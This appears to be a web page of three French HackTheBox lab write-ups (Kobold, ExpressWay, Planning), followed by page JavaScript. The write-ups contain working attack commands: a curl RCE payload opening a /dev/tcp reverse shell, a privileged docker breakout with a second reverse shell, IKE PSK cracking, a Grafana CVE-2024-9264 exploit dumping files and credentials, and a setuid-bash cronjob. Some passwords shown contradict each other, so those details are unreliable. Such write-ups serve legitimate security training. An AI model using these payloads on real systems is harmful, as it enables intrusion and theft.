# HTB — Kobold · Linux · Easy

**IP :** `10.129.245.50` &nbsp;|&nbsp; **Date :** 25 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · rustscan · ffuf · nuclei · curl · netcat · docker

---

## Contexte

> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.
> L'accès initial repose sur une **RCE non authentifiée** dans MCPJam Inspector v1.4.2,
> et l'escalade de privilèges exploite l'appartenance au groupe **docker** pour s'échapper du container et lire le flag root.

---

## Reconnaissance

### Scan de ports

```bash
rustscan -a 10.129.245.50 -u 5000
```

Rustscan repère seulement 22, 80 et 443. Le scan complet nmap révèle un quatrième port :

```bash
nmap -sC -sV -p- -O 10.129.245.50
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu-3ubuntu13.15
80/tcp   open  http     nginx 1.24.0
443/tcp  open  https    nginx 1.24.0
3552/tcp open  http     Golang net/http server
```

Le port **3552** est identifié comme `taserver` par nmap — c'est un faux positif. En réalité, c'est une webapp Go avec un frontend SvelteKit. C'est le vrai point d'entrée. À retenir : toujours faire un `-p-`, rustscan ne suffit pas.

### Scan passif (nuclei)

```bash
nuclei -target http://kobold.htb
```

Résultats notables : nginx 1.24.0 en fin de vie, en-têtes de sécurité absents (CSP, HSTS, X-Frame-Options). Aucune CVE directement exploitable côté HTTP.

### Virtual Host Fuzzing

```bash
ffuf -c -u https://kobold.htb \
     -H "Host: FUZZ.kobold.htb" \
     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
     -fc 302,403,404 -k
```

```
mcp   [Status: 200, Size: 466]
bin   [Status: 200, Size: 24402]
```

Deux sous-domaines découverts :

- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — le point d'entrée principal
- `bin.kobold.htb` → PrivateBin — intéressant pour la post-exploitation, pas pour l'accès initial

```bash
echo "10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Fuzzing de l'API (port 3552)

```bash
ffuf -u http://kobold.htb:3552/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -c -fc 200
```

```
api/docs/          [Status: 301]
api/events         [Status: 401]
api/users/current  [Status: 401]
api/users/login    [Status: 401]
```

Les endpoints existent mais nécessitent une auth. L'accès initial passera par MCPJam, pas par là.

---

## Exploitation — RCE non authentifiée (CVE-2026-23744)

**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — **sans aucune authentification**.

### Listener

```bash
nc -lvnp 4444
```

### Payload

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1"],
      "env": {}
    }
  }'
```

Le serveur exécute la commande sans valider le champ `command`. Connexion obtenue immédiatement :

```
connect to [10.10.14.153] from (UNKNOWN) [10.129.245.50] 43680
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows $(tput lines) columns $(tput cols)
```

### Flag utilisateur

```bash
cat /home/ben/user.txt
# user_flag{*********************}
```

---

## Escalade de privilèges — Docker Escape

### Énumération des groupes

```bash
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

`ben` appartient au groupe **docker**. Un membre de ce groupe peut lancer des containers en mode privilégié, monter le système de fichiers hôte, et s'échapper complètement.

```bash
docker images
# mysql                         latest    f66b7a288113
# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
```

L'image `mysql:latest` est disponible localement. Pas besoin de pull.

### Docker breakout

```bash
# Listener sur la machine d'attaque
nc -lvnp 5555
```

```bash
# Depuis le shell ben — monter le FS hôte et spawner un shell root
docker run --rm --privileged -v /:/host-root mysql:latest \
  /bin/bash -c 'chroot /host-root /bin/bash -i >& /dev/tcp/10.10.14.153/5555 0>&1'
```

Shell root obtenu dans le container. Le montage `/host-root` donne accès à tout le système hôte.

### Lecture directe du flag root (méthode propre)

```bash
docker run --rm --privileged \
  -v /:/hostfs \
  --entrypoint cat mysql:latest \
  /hostfs/root/root.txt
# root_flag{*********************}
```

---

## Flags

```
user.txt  →  user_flag{*********************}
root.txt  →  root_flag{*********************}
```

---

## Ce que j'ai retenu

**Toujours scanner `-p-`.** Rustscan avait raté le port 3552 dans son scan rapide, et nmap l'avait mal identifié. Le vrai point d'entrée était là.

**Le VHOST fuzzing est indispensable.** Le port 3552 semblait être la piste principale. Le vrai chemin était caché derrière `mcp.kobold.htb`, invisible sans fuzzing DNS.

**Les outils de dev exposent souvent une RCE triviale.** MCPJam est conçu pour connecter des serveurs MCP en passant une commande — fonctionnalité légitime, mais catastrophique sans authentification.

**`docker` dans les groupes = root.** L'appartenance à ce groupe est équivalente à sudo sans mot de passe. À checker systématiquement avec `id` dès qu'on a un shell.

---

## Ressources

- [MCPJam Inspector — GitHub](https://github.com/mcpjam/inspector)
- [HackTricks — Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [PortSwigger — Command Injection](https://portswigger.net/web-security/os-command-injection)

    </script>

</article>

# HTB — ExpressWay · Linux · Easy

**IP :** `10.10.11.87` &nbsp;|&nbsp; **Outils :** nmap · udpx · ike-scan · psk-crack · ssh

---

## Contexte

> Machine atypique : la surface d'attaque principale n'est pas HTTP mais **UDP/500 (IKE)**. Le scan TCP classique ne révèle qu'un port SSH — tout se passe côté protocole IPsec.

---

## Reconnaissance

### Scan TCP

```bash
nmap -sC -sV -O 10.10.11.87
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

Un seul port TCP ouvert. Pas de web, pas d'API. Il faut regarder ailleurs.

### Scan UDP

```bash
nmap -Pn -sU -sV -T3 --top-ports 25 10.10.11.87
```

```
69/udp   open          tftp   Netkit tftpd or atftpd
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

Le port **500/UDP (ISAKMP/IKE)** est ouvert. Ce protocole gère l'échange de clés pour les tunnels IPsec — inhabituel sur une machine CTF, et donc très intéressant.

Confirmation avec udpx :

```bash
./udpx -t 10.10.11.87
# 10.10.11.87:500 (ike)
```

---

## Exploitation

### Récupération du handshake IKE

```bash
ike-scan -M -v 10.10.11.87
```

```
10.10.11.87  Main Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)
VID=09002689dfd6b712 (XAUTH)
```

Le serveur répond en **PSK (Pre-Shared Key)**. En mode Aggressive, la clé est échangée en clair et peut être capturée :

```bash
ike-scan -A --pskcrack 10.10.11.87
```

```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
IKE PSK parameters (g_xr:g_xi:cky_r:...):
d075f9b3786680...
```

Le hash PSK est récupéré avec l'identité `ike@expressway.htb`.

### Crack du PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
```

```
key "freakingrockstarontheroad" matches SHA1 hash 6145867...
8045040 iterations in 5.034 seconds
```

Mot de passe trouvé en 5 secondes avec rockyou.

### Connexion SSH

```bash
ssh ike@10.10.11.87
# Password: lloveyou

cat ~/user.txt
# user_flag{**********************}
```

---

## Escalade de privilèges

### Énumération

```bash
id
# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Le groupe **proxy** donne accès aux logs Squid.

```bash
cat /var/log/squid/access.log.1 | grep offramp
# TCP_DENIED/403 GET http://offramp.expressway.htb
```

L'URL `offramp.expressway.htb` apparaît dans les logs — c'est un indice. `sudo` accepte un paramètre `-h` (host) pour exécuter des commandes via un hôte distant :

```bash
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
```

```
root@expressway:/# cat /root/root.txt
root_flag{**********************}
```

---

## Flags

```
user.txt  →  user_flag{**********************}
root.txt  →  root_flag{**********************}
```

---

## Ce que j'ai retenu

**Scanner UDP est indispensable.** Un scan TCP seul ne montre qu'un port SSH — la machine semblerait presque vide. Tout l'intérêt était sur le port 500/UDP.

**IKE Aggressive Mode = PSK exposé.** En mode Aggressive, le handshake contient le hash de la Pre-Shared Key. Si le mot de passe est faible, `psk-crack` + rockyou le retrouve en quelques secondes.

**`sudo -h` est une technique de privesc peu connue.** L'option `-h` permet d'indiquer un hôte pour l'exécution — exploitable quand un hôte interne fait confiance à la machine cible.

---

## Ressources

- [UDPx — GitHub](https://github.com/nullt3r/udpx)
- [ike-scan — documentation](https://github.com/royhills/ike-scan)
- [HackTricks — IKE / IPsec](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting)

# HTB — Planning · Linux · Easy

**IP :** `10.10.11.68` &nbsp;|&nbsp; **Outils :** nmap · nuclei · ffuf · gobuster · CVE-2024-9264 · ssh

> **Credentials fournis au départ :** `admin / 0D5oT70Fq13EvB5r`

---

## Contexte

> La machine expose une instance **Grafana v11.0.0** vulnérable à une injection DuckDB (CVE-2024-9264). L'exploitation permet de lire des fichiers et d'exécuter des commandes, ce qui mène à des credentials SSH. L'escalade de privilèges passe par un cronjob accessible via un tunnel SSH.

---

## Reconnaissance

### Scan de ports

```bash
nmap -p- -sC -sV -O 10.10.11.68
```

```
22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu
80/tcp  open  http   nginx 1.24.0
```

Le port 80 redirige vers `http://planning.htb/`. On ajoute l'entrée dans `/etc/hosts`.

### Virtual Host Fuzzing

```bash
ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' \
     -u http://10.10.11.68 -fc 301
```

```
grafana   [Status: 302, Size: 29]
```

Sous-domaine `grafana.planning.htb` découvert. On ajoute l'entrée dans `/etc/hosts`.

### Identification de la version Grafana

```bash
curl -s "http://grafana.planning.htb/login" | grep -i version
# "version":"11.0.0"
```

Grafana **v11.0.0** — vulnérable à CVE-2024-9264.

---

## Exploitation — CVE-2024-9264 (Grafana DuckDB RCE)

CVE-2024-9264 permet à un utilisateur authentifié d'injecter des requêtes DuckDB via le moteur de datasource, ce qui permet de **lire des fichiers arbitraires** et d'**exécuter des commandes système**.

```bash
git clone https://github.com/nollium/CVE-2024-9264.git
cd CVE-2024-9264
```

### Lecture de fichiers

```bash
python3 CVE-2024-9264.py \
  -u admin -p 0D5oT70Fq13EvB5r \
  -f /etc/passwd \
  http://grafana.planning.htb
```

```
root:x:0:0:root:/root:/bin/bash
...
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

### Extraction des variables d'environnement

Le container Docker contient les credentials admin dans ses variables d'env :

```bash
python3 CVE-2024-9264.py \
  -u admin -p 0D5oT70Fq13EvB5r \
  -c "env" \
  http://grafana.planning.htb
```

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

### Connexion SSH

```bash
ssh enzo@10.10.11.68
# Password: whoami!

cat ~/user.txt
# user_flag{*********************************}
```

---

## Escalade de privilèges

### Découverte du crontab manager

```bash
netstat -tulnp
# 127.0.0.1:8000   LISTEN
```

Un service tourne en local sur le port 8000. Exploration du système de fichiers :

```bash
cat /opt/crontabs/crontab.db
```

```json
{"name":"Grafana backup","command":"...zip -P P4ssw0rdS0pRi0T3c ...","schedule":"@daily",...}
```

Le mot de passe `P4ssw0rdS0pRi0T3c` est en clair dans la base du crontab manager.

### Tunnel SSH

```bash
ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
```

On accède à l'UI du crontab manager sur `http://127.0.0.1:8000` avec :

```
Login : root
Password : P4ssw0rdS0pRi0T3c
```

### Injection de cronjob malveillant

Dans l'interface web, on ajoute un nouveau job avec la commande :

```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

Après exécution du cronjob (fréquence : `* * * * *`) :

```bash
/tmp/rootbash -p

rootbash-5.2# cat /root/root.txt
# root_flag{*********************************}
```

user.txt  →  user_flag{*********************************}
root.txt  →  root_flag{*********************************}

## Ce que j'ai retenu

**Les variables d'environnement Docker fuient souvent des secrets.** La commande `env` dans un container expose régulièrement des credentials en clair — à toujours tenter en cas de RCE dans un container.

**Un tunnel SSH ouvre des services invisibles.** `netstat -tulnp` côté serveur révèle des ports internes inaccessibles depuis l'extérieur. Un tunnel SSH les rend accessibles localement en une commande.

**Les fichiers de config contiennent des mots de passe en clair.** `/opt/crontabs/crontab.db` stockait le password root sans chiffrement. Explorer `/opt`, `/var`, et `/etc` après accès SSH est systématique.

    if (mdScript) {
      contentDiv.innerHTML = marked.parse(mdScript.textContent);

  // 3) Accordion: attach listeners AFTER markdown parsed - avec hauteur dynamique
  document.querySelectorAll('.clickable').forEach(title => {
    title.addEventListener('click', () => {
      const item = title.parentElement;
      const content = item.querySelector('.writeup-content');
      if (!content) return;

      const isOpen = content.classList.contains('open');

      // Close others
      document.querySelectorAll('.writeup-content.open').forEach(other => {
        if (other !== content) {
          other.style.height = '0';
          other.classList.remove('open');
          const othTitle = other.parentElement.querySelector('.clickable');
          if (othTitle) othTitle.classList.remove('open');
        }
      });

      // Toggle current
      if (isOpen) {
        content.style.height = '0';
      } else {
        content.classList.add('open');
        content.style.height = content.scrollHeight + 'px'; // Hauteur exacte
      }
      title.classList.toggle('open', !isOpen);

      if (!isOpen) setTimeout(() => hljs.highlightAll(), 120);
    });
  });

  // 4) Theme toggle
  const toggle = document.getElementById('theme-toggle');
  const icon = toggle.querySelector('.theme-icon');
  const hlTheme = document.getElementById('highlight-theme');

  function applyTheme(isDark) {
    if (isDark) {
      document.body.classList.remove('light-mode');
      document.body.classList.add('dark-mode');
      icon.textContent = '☀️';
      hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
    } else {
      document.body.classList.remove('dark-mode');
      document.body.classList.add('light-mode');
      icon.textContent = '🌙';
      hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
    }
    setTimeout(() => hljs.highlightAll(), 160);
  }

  const saved = localStorage.getItem('theme');
  const isDark = (saved === 'dark' || saved === null);
  applyTheme(isDark);

  toggle.addEventListener('click', () => {
    const nowDark = document.body.classList.contains('dark-mode');
    applyTheme(!nowDark);
    localStorage.setItem('theme', !nowDark ? 'dark' : 'light');
  });
});
